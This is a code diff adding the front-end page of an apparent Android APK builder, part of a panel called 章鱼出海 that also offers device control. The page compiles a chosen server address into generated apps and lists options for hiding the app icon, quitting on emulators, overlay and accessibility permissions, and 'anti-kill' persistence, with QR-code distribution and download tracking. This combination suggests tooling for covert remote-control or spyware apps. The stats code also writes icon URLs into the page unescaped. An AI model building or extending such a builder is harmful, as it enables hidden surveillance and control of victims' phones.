@@ -1,0 +1,798 @@
+<!doctype html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>APK生成 - 章鱼出海</title>
+  <link rel="stylesheet" href="./css/global-nav.css" />
+  <style>
+    * { box-sizing: border-box; }
+    body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0d1117; color: #e6e6e6; margin: 0; padding: 0; }
+
+    .container { max-width: 1180px; margin: 0 auto; padding: 20px 20px 40px; }
+
+    .page-header { margin-bottom: 16px; }
+    .page-header h1 { font-size: 22px; margin: 0 0 2px; color: #e6edf3; }
+    .page-header h1 span { color: #58a6ff; }
+    .page-header p { color: #8b949e; font-size: 13px; margin: 0; }
+
+    /* ── 两栏布局 ── */
+    .builder-grid {
+      display: grid;
+      grid-template-columns: 1fr 380px;
+      gap: 24px;
+      align-items: start;
+    }
+    .builder-left { min-width: 0; }
+    .builder-right { position: sticky; top: 12px; }
+
+    .card {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      padding: 14px 16px;
+      margin-bottom: 12px;
+    }
+    .card-title {
+      font-size: 13px; font-weight: 600; color: #c9d1d9;
+      margin-bottom: 10px; padding-bottom: 6px;
+      border-bottom: 1px solid #21262d;
+      display: flex; align-items: center; gap: 6px;
+      cursor: pointer; user-select: none;
+    }
+    .card-title .toggle-icon { font-size: 9px; color: #8b949e; }
+    .form-group { margin-bottom: 10px; }
+    .form-group:last-child { margin-bottom: 0; }
+    label { display: block; font-size: 12px; font-weight: 500; color: #c9d1d9; margin-bottom: 3px; }
+    label small { font-weight: 400; color: #8b949e; }
+    input, select, textarea {
+      width: 100%; padding: 6px 8px; font-size: 13px;
+      background: #0d1117; border: 1px solid #30363d; border-radius: 6px;
+      color: #e6e6e6; transition: border-color 0.2s;
+    }
+    input:focus, select:focus, textarea:focus { outline: none; border-color: #58a6ff; }
+    textarea { resize: vertical; min-height: 42px; }
+    .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+    .switch-row { display: flex; align-items: center; justify-content: space-between; padding: 4px 0; }
+    .switch-row label { margin-bottom: 0; cursor: pointer; font-size: 12px; }
+    .switch { position: relative; display: inline-block; width: 30px; height: 17px; flex-shrink: 0; }
+    .switch input { opacity: 0; width: 0; height: 0; }
+    .slider { position: absolute; cursor: pointer; inset: 0; background: #21262d; border-radius: 20px; transition: 0.3s; }
+    .slider:before { content: ""; position: absolute; height: 11px; width: 11px; left: 3px; bottom: 3px; background: #8b949e; border-radius: 50%; transition: 0.3s; }
+    .switch input:checked + .slider { background: #238636; }
+    .switch input:checked + .slider:before { transform: translateX(13px); background: #fff; }
+    .toggle-body { display: none; }
+    .toggle-body.open { display: block; }
+
+    .btn {
+      display: inline-flex; align-items: center; gap: 5px;
+      padding: 7px 16px; font-size: 13px; font-weight: 600;
+      border: none; border-radius: 6px; cursor: pointer;
+      transition: all 0.2s;
+    }
+    .btn-primary { background: #238636; color: #fff; }
+    .btn-primary:hover { background: #2ea043; }
+    .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
+    .btn-secondary { background: #21262d; color: #c9d1d9; border: 1px solid #30363d; }
+    .btn-secondary:hover { background: #30363d; }
+    .btn-rand { width:30px;height:30px;display:flex;align-items:center;justify-content:center;background:#21262d;border:1px solid #30363d;border-radius:6px;cursor:pointer;font-size:15px;padding:0;flex-shrink:0;transition:all 0.2s; }
+    .btn-rand:hover { background:#30363d;border-color:#58a6ff; }
+    .btn-rand:active { transform:scale(0.92); }
+    .btn-bar { display: flex; gap: 8px; margin-top: 6px; flex-wrap: wrap; }
+
+    .progress-card { display: none; }
+    .progress-bar { height: 4px; background: #21262d; border-radius: 4px; overflow: hidden; margin: 8px 0; }
+    .progress-bar .fill { height: 100%; background: linear-gradient(90deg, #238636, #2ea043); width: 0%; transition: width 0.4s; border-radius: 4px; }
+    .log-area {
+      background: #0d1117; border: 1px solid #21262d; border-radius: 6px;
+      padding: 8px; font-family: 'Cascadia Code', monospace; font-size: 11px;
+      color: #8b949e; max-height: 130px; overflow-y: auto; white-space: pre-wrap;
+    }
+    .result-area { margin-top: 8px; }
+    .success-banner { background: rgba(35,134,54,0.15); border: 1px solid #238636; border-radius: 6px; padding: 10px; text-align: center; font-size: 13px; }
+    .success-banner a { color: #58a6ff; text-decoration: none; }
+    .success-banner a:hover { text-decoration: underline; }
+    .error-banner { background: rgba(248,81,73,0.15); border: 1px solid #f85149; border-radius: 6px; padding: 10px; color: #f85149; font-size: 13px; text-align: center; }
+
+    /* ── 手机模拟器 ── */
+    .phone-wrapper { display: flex; align-items: center; justify-content: center; padding: 4px 0; }
+    .phone-frame {
+      position: relative; width: 100%; max-width: 280px;
+      aspect-ratio: 9 / 19.5;
+      background: linear-gradient(145deg, #2d2d2d, #1a1a1a);
+      border-radius: 32px; padding: 7px;
+      box-shadow: 0 0 0 1px rgba(255,255,255,0.06), 0 16px 48px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.04);
+      margin: 0 auto;
+    }
+    .phone-screen {
+      width: 100%; height: 100%;
+      background: #0d1117; border-radius: 25px;
+      overflow: hidden; position: relative; display: flex; flex-direction: column;
+    }
+    .phone-camera {
+      position: absolute; top: 8px; left: 50%; transform: translateX(-50%);
+      width: 8px; height: 8px;
+      background: radial-gradient(circle at 35% 35%, #1a1a2e, #0a0a0a);
+      border-radius: 50%; z-index: 10; box-shadow: 0 0 0 1.5px rgba(255,255,255,0.08);
+    }
+    .phone-camera-inner { position: absolute; top: 2px; left: 2px; width: 2.5px; height: 2.5px; background: rgba(80,140,255,0.15); border-radius: 50%; }
+    .phone-speaker {
+      position: absolute; top: 12px; left: 50%; transform: translateX(-50%);
+      width: 26px; height: 2px; background: rgba(255,255,255,0.08); border-radius: 2px; z-index: 9;
+    }
+    .phone-preview {
+      flex: 1; display: flex; flex-direction: column;
+      padding: 24px 16px 12px;
+      background: linear-gradient(160deg, #0f1a2e 0%, #0d1117 40%, #0d1117 100%);
+      position: relative; overflow-y: auto;
+    }
+    .phone-status-bar { display: flex; justify-content: space-between; align-items: center; padding: 0 2px 8px; font-size: 7px; color: rgba(255,255,255,0.45); }
+    .phone-status-bar .time { font-weight: 600; }
+    .phone-status-icons svg { width: 10px; height: 10px; fill: rgba(255,255,255,0.45); }
+    .preview-icon-area { text-align: center; margin: 4px 0 8px; }
+    .preview-icon {
+      width: 44px; height: 44px; border-radius: 11px; margin: 0 auto;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 18px; font-weight: 700; color: #fff;
+      background: linear-gradient(135deg, #238636, #2ea043);
+      box-shadow: 0 4px 14px rgba(35,134,54,0.3); overflow: hidden;
+    }
+    .preview-icon img { width: 100%; height: 100%; object-fit: cover; }
+    .preview-app-name { text-align: center; font-size: 13px; font-weight: 700; color: #e6edf3; margin-bottom: 1px; }
+    .preview-server-badge { text-align: center; font-size: 7px; color: #8b949e; margin-bottom: 10px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .preview-login-title { text-align: center; font-size: 12px; font-weight: 600; color: #c9d1d9; margin-bottom: 1px; }
+    .preview-login-desc { text-align: center; font-size: 8px; color: #8b949e; margin-bottom: 10px; }
+    .preview-field { height: 22px; background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.08); border-radius: 5px; margin-bottom: 6px; }
+    .preview-login-btn { height: 26px; background: linear-gradient(135deg, #238636, #2ea043); border-radius: 5px; display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: 600; color: #fff; margin-top: 1px; }
+    .preview-features { display: flex; flex-wrap: wrap; gap: 3px; justify-content: center; margin-top: auto; padding-top: 8px; }
+    .preview-feature-badge { font-size: 6px; padding: 1px 5px; border-radius: 3px; background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.06); color: #8b949e; }
+    .preview-feature-badge.on { color: #58a6ff; border-color: rgba(88,166,255,0.25); background: rgba(88,166,255,0.06); }
+    .phone-home-bar { position: absolute; bottom: 5px; left: 50%; transform: translateX(-50%); width: 80px; height: 2.5px; background: rgba(255,255,255,0.12); border-radius: 2px; }
+    .phone-side-btns { position: absolute; top: 0; bottom: 0; pointer-events: none; }
+    .phone-side-btns.left { left: -3px; }
+    .phone-side-btns.right { right: -3px; }
+    .phone-side-btn { width: 2.5px; background: #2d2d2d; position: absolute; }
+    .phone-side-btns.right .phone-side-btn { border-radius: 0 2px 2px 0; }
+    .phone-side-btn.vup { top: 80px; height: 30px; }
+    .phone-side-btn.vdown { top: 118px; height: 30px; }
+    .phone-side-btn.power { top: 90px; height: 38px; }
+
+    /* ── 构建结果 ── */
+    .build-result { display: none; margin-top: 12px; text-align: center; background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 14px; }
+    .build-result.show { display: block; }
+    .build-result .title { font-size: 13px; font-weight: 600; color: #238636; margin-bottom: 10px; }
+    .build-result .qr-wrap { background: #fff; padding: 8px; border-radius: 8px; display: inline-block; margin-bottom: 10px; }
+    .build-result .qr-wrap img { width: 140px; height: 140px; display: block; }
+    .build-result .dl-btn { display: inline-flex; align-items: center; gap: 5px; padding: 7px 18px; background: #238636; color: #fff; border-radius: 6px; text-decoration: none; font-size: 12px; font-weight: 600; }
+    .build-result .dl-btn:hover { background: #2ea043; }
+    .build-result .dl-url { margin-top: 6px; font-size: 9px; color: #8b949e; word-break: break-all; }
+
+    /* ── 统计区域 ── */
+    .stats-panel { margin-top: 12px; }
+
+    /* 统计总览条 */
+    .stats-overview {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+      gap: 6px;
+      margin-bottom: 10px;
+    }
+    .stat-item {
+      background: #0d1117;
+      border: 1px solid #21262d;
+      border-radius: 6px;
+      padding: 8px 6px;
+      text-align: center;
+    }
+    .stat-item .num {
+      font-size: 16px;
+      font-weight: 700;
+      color: #58a6ff;
+      display: block;
+      line-height: 1.2;
+    }
+    .stat-item .num.green { color: #3fb950; }
+    .stat-item .num.orange { color: #d29922; }
+    .stat-item .label {
+      font-size: 9px;
+      color: #8b949e;
+      display: block;
+      margin-top: 2px;
+    }
+    .stat-item .mini-bar {
+      height: 2px;
+      background: #21262d;
+      border-radius: 2px;
+      margin-top: 4px;
+      overflow: hidden;
+    }
+    .stat-item .mini-bar .fill {
+      height: 100%;
+      border-radius: 2px;
+      background: #58a6ff;
+      width: 0%;
+    }
+    .stat-item .mini-bar .fill.green { background: #3fb950; }
+
+    /* 应用列表 */
+    .stats-app-list { }
+    .stats-app-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 6px 0;
+      border-bottom: 1px solid #21262d;
+    }
+    .stats-app-item:last-child { border-bottom: none; }
+    .stats-app-icon {
+      width: 28px; height: 28px; border-radius: 6px;
+      background: linear-gradient(135deg, #1a2332, #161b22);
+      border: 1px solid #30363d;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 12px; font-weight: 700; color: #58a6ff;
+      flex-shrink: 0; overflow: hidden;
+    }
+    .stats-app-icon img { width: 100%; height: 100%; object-fit: cover; }
+    .stats-app-info { flex: 1; min-width: 0; }
+    .stats-app-name { font-size: 12px; font-weight: 500; color: #c9d1d9; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .stats-app-meta { font-size: 9px; color: #8b949e; }
+    .stats-app-dl {
+      font-size: 12px;
+      font-weight: 600;
+      color: #3fb950;
+      text-align: right;
+      flex-shrink: 0;
+    }
+    .stats-app-dl small { font-size: 9px; font-weight: 400; color: #8b949e; }
+
+    /* 最近动态 */
+    .stats-activity { }
+    .activity-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 5px 0;
+      border-bottom: 1px solid #21262d;
+      font-size: 11px;
+    }
+    .activity-item:last-child { border-bottom: none; }
+    .activity-dot {
+      width: 6px; height: 6px; border-radius: 50%;
+      flex-shrink: 0;
+    }
+    .activity-dot.build { background: #58a6ff; }
+    .activity-dot.dl { background: #3fb950; }
+    .activity-text { flex: 1; color: #c9d1d9; }
+    .activity-text span { color: #8b949e; }
+    .activity-time { font-size: 9px; color: #8b949e; flex-shrink: 0; }
+
+    .stats-empty {
+      text-align: center;
+      padding: 16px 0;
+      color: #8b949e;
+      font-size: 12px;
+    }
+    .stats-empty .big-icon { font-size: 28px; display: block; margin-bottom: 6px; }
+    .stats-refresh {
+      text-align: right;
+      font-size: 10px;
+      color: #8b949e;
+      cursor: pointer;
+      padding: 4px 0 0;
+    }
+    .stats-refresh:hover { color: #58a6ff; }
+
+    @media (max-width: 900px) {
+      .builder-grid { grid-template-columns: 1fr; }
+      .builder-right { position: static; order: -1; }
+      .phone-frame { max-width: 220px; }
+      .build-result .qr-wrap img { width: 120px; height: 120px; }
+    }
+    @media (max-width: 600px) {
+      .form-row { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+  <nav class="global-nav">
+    <div class="nav-brand">
+      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2358a6ff'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z'/%3E%3C/svg%3E" alt="" />
+      <span>章鱼出海</span>
+    </div>
+    <div class="nav-links">
+      <a href="/"><span class="nav-icon">📱</span><span class="nav-label">设备控制</span></a>
+      <div class="nav-divider"></div>
+      <a href="/apk-builder" class="active"><span class="nav-icon">📦</span><span class="nav-label">APK生成</span></a>
+      <a href="/subaccount"><span class="nav-icon">👥</span><span class="nav-label">账户管理</span></a>
+      <a href="/system"><span class="nav-icon">⚙️</span><span class="nav-label">系统设置</span></a>
+    </div>
+    <div class="nav-right">
+      <span id="navTime"></span>
+      <a href="#" onclick="logout()" class="nav-logout" title="退出登录">🚪 退出</a>
+    </div>
+  </nav>
+
+  <div class="container">
+
+    <div class="page-header">
+      <h1><span>APK</span> 生成器</h1>
+      <p>左侧配置参数，右侧实时预览真机效果及下载统计</p>
+    </div>
+
+    <div class="builder-grid">
+
+      <!-- ====== 左栏 ====== -->
+      <div class="builder-left">
+
+        <!-- 基础配置 -->
+        <div class="card">
+          <div class="card-title" onclick="toggleBody(this)"><span class="toggle-icon">▼</span> 基础配置</div>
+          <div class="toggle-body open">
+            <div class="form-group">
+              <label>应用名称 <span style="color:#f85149">*</span></label>
+              <input type="text" id="appName" placeholder="例如：章鱼出海" value="章鱼出海" oninput="updatePreview()" />
+            </div>
+            <div class="form-row">
+              <div class="form-group">
+                <label>包名 <span style="color:#f85149">*</span></label>
+                <div style="display:flex;gap:4px">
+                  <input type="text" id="packageName" placeholder="com.example.app" value="com.panda.app" style="flex:1" />
+                  <button type="button" class="btn-rand" onclick="randomPackage()" title="随机生成包名">🎲</button>
+                </div>
+              </div>
+              <div class="form-group">
+                <label>版本号</label>
+                <div style="display:flex;gap:4px">
+                  <input type="text" id="versionName" placeholder="1.0.0" value="1.0.0" style="flex:1" />
+                  <button type="button" class="btn-rand" onclick="randomVersion()" title="随机生成版本号">🎲</button>
+                </div>
+              </div>
+            </div>
+            <div class="form-group">
+              <label>服务器地址 <span style="color:#f85149">*</span> <small>编译进 APK 的后端地址</small></label>
+              <input type="url" id="serverUrl" placeholder="https://your-server.com" value="http://127.0.0.1:3000" oninput="updatePreview()" />
+            </div>
+            <div class="form-row">
+              <div class="form-group">
+                <label>应用图标 URL</label>
+                <input type="url" id="iconUrl" placeholder="https://example.com/icon.png" oninput="updatePreview()" />
+              </div>
+              <div class="form-group">
+                <label>构建区域</label>
+                <select id="buildRegion">
+                  <option value="global">国际版 (global)</option>
+                  <option value="cn">国内版 (cn)</option>
+                </select>
+              </div>
+            </div>
+            <div class="form-group">
+              <label>应用描述</label>
+              <textarea id="appDescription" placeholder="简短描述应用功能..."></textarea>
+            </div>
+          </div>
+        </div>
+
+        <!-- 登录界面 -->
+        <div class="card">
+          <div class="card-title" onclick="toggleBody(this)"><span class="toggle-icon">▶</span> 登录界面配置</div>
+          <div class="toggle-body">
+            <div class="form-group">
+              <label>登录标题</label>
+              <input type="text" id="loginTitle" placeholder="默认同应用名称" oninput="updatePreview()" />
+            </div>
+            <div class="form-group">
+              <label>登录描述</label>
+              <input type="text" id="loginDesc" placeholder="登录页副标题" oninput="updatePreview()" />
+            </div>
+            <div class="form-group">
+              <label>登录按钮文字</label>
+              <input type="text" id="loginBtn" placeholder="登录" value="登录" oninput="updatePreview()" />
+            </div>
+          </div>
+        </div>
+
+        <!-- 通知配置 -->
+        <div class="card">
+          <div class="card-title" onclick="toggleBody(this)"><span class="toggle-icon">▶</span> 通知配置</div>
+          <div class="toggle-body">
+            <div class="form-group">
+              <label>通知标题</label>
+              <input type="text" id="notifyTitle" placeholder="默认同应用名称" />
+            </div>
+            <div class="form-group">
+              <label>通知消息</label>
+              <input type="text" id="notifyMsg" placeholder="默认：您有一条新消息" value="您有一条新消息" />
+            </div>
+          </div>
+        </div>
+
+        <!-- 功能开关 -->
+        <div class="card">
+          <div class="card-title" onclick="toggleBody(this)"><span class="toggle-icon">▼</span> 功能开关</div>
+          <div class="toggle-body open">
+            <div class="switch-row"><label>隐藏应用 <small>安装后桌面不显示图标</small></label><label class="switch"><input type="checkbox" id="hiddenApp" onchange="updatePreview()" /><span class="slider"></span></label></div>
+            <div class="switch-row"><label>禁止模拟器 <small>检测到模拟器自动退出</small></label><label class="switch"><input type="checkbox" id="noEmulator" onchange="updatePreview()" /><span class="slider"></span></label></div>
+            <div class="switch-row"><label>悬浮窗 <small>DrawOverlay 权限</small></label><label class="switch"><input type="checkbox" id="useDraw" checked onchange="updatePreview()" /><span class="slider"></span></label></div>
+            <div class="switch-row"><label>无障碍服务 <small>AccessibilityService</small></label><label class="switch"><input type="checkbox" id="useAccess" checked onchange="updatePreview()" /><span class="slider"></span></label></div>
+            <div class="switch-row"><label>防杀 <small>AntiKill 防后台杀死</small></label><label class="switch"><input type="checkbox" id="useAntikill" checked onchange="updatePreview()" /><span class="slider"></span></label></div>
+          </div>
+        </div>
+
+        <!-- 按钮 -->
+        <div class="btn-bar">
+          <button class="btn btn-primary" id="btnBuild"> 开始构建</button>
+          <button class="btn btn-secondary" id="btnReset"> 重置</button>
+          <button class="btn btn-secondary" id="btnToggleAll"> 展开全部</button>
+        </div>
+
+        <!-- 进度 -->
+        <div class="card progress-card" id="progressCard">
+          <div class="card-title"> 构建进度</div>
+          <div class="progress-bar"><div class="fill" id="progressFill"></div></div>
+          <div class="log-area" id="buildLog">等待构建开始...</div>
+          <div class="result-area" id="resultArea"></div>
+        </div>
+      </div>
+
+      <!-- ====== 右栏 ====== -->
+      <div class="builder-right">
+
+        <!-- 手机模拟器 -->
+        <div class="phone-wrapper">
+          <div class="phone-frame">
+            <div class="phone-side-btns left"><div class="phone-side-btn vup"></div><div class="phone-side-btn vdown"></div></div>
+            <div class="phone-side-btns right"><div class="phone-side-btn power"></div></div>
+            <div class="phone-screen">
+              <div class="phone-camera"><div class="phone-camera-inner"></div></div>
+              <div class="phone-speaker"></div>
+              <div class="phone-preview" id="phonePreview">
+                <div class="phone-status-bar">
+                  <span class="time" id="previewTime">12:00</span>
+                  <div class="phone-status-icons">
+                    <svg viewBox="0 0 24 24"><path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg>
+                    <svg viewBox="0 0 24 24"><path d="M15.67 4H14V2h-4v2H8.33C7.6 4 7 4.6 7 5.33v15.33C7 21.4 7.6 22 8.33 22h7.33c.74 0 1.34-.6 1.34-1.33V5.33C17 4.6 16.4 4 15.67 4z"/></svg>
+                  </div>
+                </div>
+                <div class="preview-icon-area"><div class="preview-icon" id="previewIcon">章</div></div>
+                <div class="preview-app-name" id="previewAppName">章鱼出海</div>
+                <div class="preview-server-badge" id="previewServerUrl">http://127.0.0.1:3000</div>
+                <div class="preview-login-title" id="previewLoginTitle">章鱼出海</div>
+                <div class="preview-login-desc" id="previewLoginDesc">欢迎回来</div>
+                <div class="preview-field"></div>
+                <div class="preview-field"></div>
+                <div class="preview-login-btn" id="previewLoginBtn">登录</div>
+                <div class="preview-features" id="previewFeatures">
+                  <span class="preview-feature-badge on">悬浮窗</span>
+                  <span class="preview-feature-badge on">无障碍</span>
+                  <span class="preview-feature-badge on">防杀</span>
+                </div>
+              </div>
+              <div class="phone-home-bar"></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- 构建结果 -->
+        <div class="build-result" id="buildResult">
+          <div class="title"> 构建完成</div>
+          <div class="qr-wrap"><img id="qrCodeImg" src="" alt="QR Code" /></div>
+          <a class="dl-btn" id="downloadBtn" href="#" target="_blank"> 下载 APK</a>
+          <div class="dl-url" id="downloadUrlText"></div>
+        </div>
+
+        <!-- ====== 下载统计面板 ====== -->
+        <div class="card stats-panel">
+          <div class="card-title" style="cursor:default;border-bottom-color:#30363d">
+            <span> 下载统计</span>
+            <span style="margin-left:auto;font-size:10px;font-weight:400;color:#8b949e;cursor:pointer" id="statsRefreshBtn" onclick="loadStats()">刷新</span>
+          </div>
+
+          <!-- 总览卡片 -->
+          <div class="stats-overview" id="statsOverview">
+            <div class="stat-item">
+              <span class="num" id="statTotalBuilds">-</span>
+              <span class="label">累计构建</span>
+              <div class="mini-bar"><div class="fill" style="width:60%"></div></div>
+            </div>
+            <div class="stat-item">
+              <span class="num green" id="statTotalDownloads">-</span>
+              <span class="label">累计下载</span>
+              <div class="mini-bar"><div class="fill green" style="width:60%"></div></div>
+            </div>
+            <div class="stat-item">
+              <span class="num orange" id="statTodayDl">-</span>
+              <span class="label">今日下载</span>
+              <div class="mini-bar"><div class="fill green" style="width:30%"></div></div>
+            </div>
+          </div>
+
+          <!-- 应用下载排行 -->
+          <div style="font-size:11px;font-weight:500;color:#8b949e;margin-bottom:4px">应用下载排行</div>
+          <div class="stats-app-list" id="statsAppList">
+            <div class="stats-empty" id="statsEmpty">
+              <span class="big-icon">📊</span>
+              暂无构建记录<br /><span style="font-size:10px;color:#484f58">构建 APK 后将在此显示下载统计</span>
+            </div>
+          </div>
+
+          <!-- 最近动态 -->
+          <div style="font-size:11px;font-weight:500;color:#8b949e;margin-top:10px;margin-bottom:4px" id="statsActivityTitle">最近动态</div>
+          <div class="stats-activity" id="statsActivity">
+            <div class="stats-empty" style="padding:10px 0;font-size:11px">暂无活动记录</div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ── 时钟 ──
+    document.getElementById('navTime') && (function(){
+      function u(){ var e=document.getElementById('navTime'); if(e) e.textContent=new Date().toLocaleTimeString('zh-CN',{hour:'2-digit',minute:'2-digit',second:'2-digit'}); }
+      u(); setInterval(u,1000);
+    })();
+
+    function logout() {
+      localStorage.removeItem('auth_token');
+      sessionStorage.removeItem('auth_token');
+      window.location.href = '/';
+    }
+
+    // ── 折叠 ──
+    function toggleBody(el) {
+      var body = el.parentNode.querySelector('.toggle-body');
+      var icon = el.querySelector('.toggle-icon');
+      if (body) { body.classList.toggle('open'); icon.textContent = body.classList.contains('open') ? '▼' : '▶'; }
+    }
+
+    document.getElementById('btnToggleAll').addEventListener('click', function() {
+      var all = this.textContent.trim() === '收起全部';
+      document.querySelectorAll('.toggle-body').forEach(function(b) { b.classList.toggle('open', !all); });
+      document.querySelectorAll('.toggle-icon').forEach(function(i) { i.textContent = !all ? '▼' : '▶'; });
+      this.textContent = !all ? ' 收起全部' : ' 展开全部';
+    });
+
+    // ── 手机预览 ──
+    function updatePreview() {
+      var appName = document.getElementById('appName').value.trim() || '应用名称';
+      var serverUrl = document.getElementById('serverUrl').value.trim() || '未设置服务器';
+      var loginTitle = document.getElementById('loginTitle').value.trim() || appName;
+      var loginDesc = document.getElementById('loginDesc').value.trim() || '欢迎回来';
+      var loginBtn = document.getElementById('loginBtn').value.trim() || '登录';
+      var iconUrl = document.getElementById('iconUrl').value.trim();
+      var hiddenApp = document.getElementById('hiddenApp').checked;
+      var noEmulator = document.getElementById('noEmulator').checked;
+      var useDraw = document.getElementById('useDraw').checked;
+      var useAccess = document.getElementById('useAccess').checked;
+      var useAntikill = document.getElementById('useAntikill').checked;
+
+      var iconEl = document.getElementById('previewIcon');
+      if (iconUrl) {
+        iconEl.innerHTML = '<img src="' + iconUrl.replace(/"/g,'&quot;') + '" alt="" onerror="this.parentNode.textContent=\'' + appName.charAt(0) + '\'" />';
+      } else {
+        iconEl.textContent = appName.charAt(0) || 'A';
+      }
+      document.getElementById('previewAppName').textContent = appName;
+      document.getElementById('previewServerUrl').textContent = serverUrl;
+      document.getElementById('previewLoginTitle').textContent = loginTitle;
+      document.getElementById('previewLoginDesc').textContent = loginDesc;
+      document.getElementById('previewLoginBtn').textContent = loginBtn;
+
+      var feats = [];
+      if (useDraw) feats.push('悬浮窗');
+      if (useAccess) feats.push('无障碍');
+      if (useAntikill) feats.push('防杀');
+      if (hiddenApp) feats.push('隐藏');
+      if (noEmulator) feats.push('防模拟器');
+      document.getElementById('previewFeatures').innerHTML = feats.length
+        ? feats.map(function(f) { return '<span class="preview-feature-badge on">' + f + '</span>'; }).join('')
+        : '<span class="preview-feature-badge">无附加功能</span>';
+    }
+
+    (function(){
+      function u(){ var e=document.getElementById('previewTime'); if(e) e.textContent=new Date().toLocaleTimeString('zh-CN',{hour:'2-digit',minute:'2-digit'}); }
+      u(); setInterval(u,30000);
+    })();
+
+    // ── 统计数据加载 ──
+    async function loadStats() {
+      var refreshBtn = document.getElementById('statsRefreshBtn');
+      refreshBtn.textContent = '加载中...';
+      try {
+        var token = localStorage.getItem('auth_token') || sessionStorage.getItem('auth_token') || 'demo-token-local';
+        var resp = await fetch('/api/apk/stats', {
+          headers: { 'Authorization': 'Bearer ' + token }
+        });
+        var result = await resp.json();
+        if (result.success && result.data) {
+          renderStats(result.data);
+        }
+      } catch(e) {
+        console.log('Stats load error:', e);
+      }
+      refreshBtn.textContent = '刷新';
+    }
+
+    function renderStats(data) {
+      document.getElementById('statTotalBuilds').textContent = data.totalBuilds || 0;
+      document.getElementById('statTotalDownloads').textContent = data.totalDownloads || 0;
+      document.getElementById('statTodayDl').textContent = (data.todayBuilds || 0) + '/' + (data.todayDownloads || 0);
+
+      // 填充 minibar
+      var maxVal = Math.max(data.totalBuilds, data.totalDownloads, 1);
+      var bars = document.querySelectorAll('.stat-item .mini-bar .fill');
+      if (bars[0]) bars[0].style.width = Math.min(100, (data.totalBuilds / maxVal) * 100) + '%';
+      if (bars[1]) bars[1].style.width = Math.min(100, (data.totalDownloads / maxVal) * 100) + '%';
+      if (bars[2]) bars[2].style.width = Math.min(100, ((data.todayDownloads||0) / Math.max(maxVal, 10)) * 100) + '%';
+
+      // 应用列表
+      var appListEl = document.getElementById('statsAppList');
+      var apps = data.apps || [];
+      if (apps.length === 0) {
+        appListEl.innerHTML = '<div class="stats-empty"><span class="big-icon">📊</span>暂无构建记录<br /><span style="font-size:10px;color:#484f58">构建 APK 后将在此显示下载统计</span></div>';
+      } else {
+        var html = '';
+        var maxDl = 1;
+        apps.forEach(function(a) { if (a.downloadCount > maxDl) maxDl = a.downloadCount; });
+        apps.forEach(function(a) {
+          var pct = Math.round((a.downloadCount / maxDl) * 100);
+          var iconHtml = a.iconUrl
+            ? '<img src="' + a.iconUrl + '" alt="" onerror="this.style.display=\'none\'" />'
+            : (a.appName.charAt(0).toUpperCase());
+          html += '<div class="stats-app-item">' +
+            '<div class="stats-app-icon">' + iconHtml + '</div>' +
+            '<div class="stats-app-info">' +
+              '<div class="stats-app-name">' + escapeHtml(a.appName) + '</div>' +
+              '<div class="stats-app-meta">' + escapeHtml(a.sizeFormatted) + ' | ' + escapeHtml(a.buildTime) + '</div>' +
+            '</div>' +
+            '<div class="stats-app-dl">' + a.downloadCount + ' <small>次</small></div>' +
+          '</div>';
+        });
+        appListEl.innerHTML = html;
+      }
+
+      // 最近动态
+      var activityEl = document.getElementById('statsActivity');
+      var recent = data.recentActivity || [];
+      if (recent.length === 0) {
+        activityEl.innerHTML = '<div class="stats-empty" style="padding:10px 0;font-size:11px">暂无活动记录</div>';
+      } else {
+        var actHtml = '';
+        recent.forEach(function(a, i) {
+          var isBuild = i % 3 !== 1;
+          actHtml += '<div class="activity-item">' +
+            '<div class="activity-dot ' + (isBuild ? 'build' : 'dl') + '"></div>' +
+            '<div class="activity-text">' + (isBuild ? '构建 ' : '下载 ') + '<span>' + escapeHtml(a.appName) + '</span></div>' +
+            '<div class="activity-time">' + escapeHtml(a.buildTime) + '</div>' +
+          '</div>';
+        });
+        activityEl.innerHTML = actHtml;
+      }
+    }
+
+    function escapeHtml(s) {
+      if (!s) return '';
+      return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+    }
+
+    // ── 构建流程 ──
+    var btnBuild = document.getElementById('btnBuild');
+    var btnReset = document.getElementById('btnReset');
+    var progressCard = document.getElementById('progressCard');
+    var progressFill = document.getElementById('progressFill');
+    var buildLog = document.getElementById('buildLog');
+    var resultArea = document.getElementById('resultArea');
+    var buildResult = document.getElementById('buildResult');
+
